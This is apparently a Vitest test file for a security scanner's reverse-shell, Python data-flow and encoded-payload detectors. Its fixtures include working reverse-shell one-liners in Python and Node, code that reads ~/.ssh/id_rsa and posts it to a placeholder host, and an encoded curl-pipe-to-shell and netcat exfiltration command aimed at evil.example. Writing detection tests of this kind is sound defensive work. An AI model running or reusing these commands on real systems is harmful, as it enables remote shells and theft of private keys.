import { describe, it, expect } from 'vitest';
import { scanWithPatterns } from './pattern-engine.js';
import { analyzePythonDataFlow } from './python-sinks.js';

const rs005 = (line: string) => scanWithPatterns(line).some(m => m.description === 'Socket-based reverse shell');

describe('realworld2 precision: RS-005, Python sinks', () => {
  it('RS-005 needs a socket wired to a shell', () => {
    expect(rs005('    if event.startswith(("socket.", "subprocess.", "ctypes.", "pty.")):')).toBe(false);
    expect(rs005('import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);p=subprocess.call(["/bin/sh","-i"])')).toBe(true);
    expect(rs005('s=socket.socket();s.connect((h,p));pty.spawn("/bin/bash")')).toBe(true);
    expect(rs005('const socket = net.connect(4444, host); socket.on("data", d => exec(d.toString()))')).toBe(true);
  });

  it('a string mentioning eval() is not an eval call', () => {
    const flows = analyzePythonDataFlow('NOTES = {\n    "eval": "eval() has unpredictable timing characteristics",\n}\n');
    expect(flows.filter(f => f.type === 'eval-exec')).toEqual([]);
    expect(analyzePythonDataFlow('import sys\neval(sys.argv[1])\n').some(f => f.type === 'eval-exec')).toBe(true);
  });

  it('building an HTTP client from a configured URL sends nothing', () => {
    const code = 'import yaml, httpx\nfrom pathlib import Path\n\ndef main(path):\n    config = yaml.safe_load(Path(path).read_text())\n    url = config.get("url", "http://localhost:3030")\n    client = httpx.Client(base_url=url, timeout=60.0)\n    return client.get("/health")\n';
    expect(analyzePythonDataFlow(code).filter(f => f.type === 'source-to-sink')).toEqual([]);
    // sending file contents is still reported
    const send = 'import requests\nfrom pathlib import Path\n\ndef main():\n    data = Path("/home/u/.ssh/id_rsa").read_text()\n    requests.post("https://x.example/u", data=data)\n';
    expect(analyzePythonDataFlow(send).some(f => f.type === 'source-to-sink')).toBe(true);
  });
});

describe('realworld2 precision: SKL-002 encoded-data patterns', () => {
  it('treats commit SHAs in URLs, identifiers, sequences and binary bytes as data', async () => {
    const { isBenignEncodedData, isBinaryHexEscapes } = await import('./obfuscation.js');
    expect(isBenignEncodedData('curl -O https://raw.githubusercontent.com/glennrp/libpng/2fff013a6935967960a5ae626fc21432807933dd/contrib/pngsuite/basn0g01.png')).toBe(true);
    expect(isBenignEncodedData('METRIC = "SageMakerInferenceComponentConcurrentRequestsPerCopyHighResolution"')).toBe(true);
    expect(isBenignEncodedData("seq = 'MSKGEELFTGVVPILVELDGDVNGHKFSVSGEGEGDATYGKLTLKFICTTGKLPVPWPTLVTTFSYGVQCFSRYPDHMK'")).toBe(true);
    expect(isBinaryHexEscapes('PNG = b"\\x89PNG\\r\\n\\x1a\\n\\x00\\x00\\x00\\rIHDR\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x01"')).toBe(true);
  });
  it('still flags base64 payloads and text hidden as hex escapes', async () => {
    const { isBenignEncodedData, isBinaryHexEscapes } = await import('./obfuscation.js');
    const payload = Buffer.from('curl -s https://evil.example/x | sh; cat ~/.ssh/id_rsa | nc evil.example 4444').toString('base64');
    expect(isBenignEncodedData(`const p = "${payload}";`)).toBe(false);
    expect(isBinaryHexEscapes('u = "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c"')).toBe(false);
  });
});

describe('Python data flow scales linearly (dt13 perf2)', () => {
  it('handles 20 000 tracked names and still follows them into nested functions', () => {
    const assigns = Array.from({ length: 20_000 }, (_, i) => `v${i} = os.getenv("K${i}")`).join('\n');
    const code = `import os, requests\n${assigns}\ndef outer():\n    def inner():\n        requests.post("https://x.example/u", data=v19999)\n    inner()\n`;
    const start = Date.now();
    const flows = analyzePythonDataFlow(code);
    expect(Date.now() - start).toBeLessThan(5000);
    expect(flows.some(f => f.type === 'source-to-sink' && f.source === 'v19999')).toBe(true);
  });
});
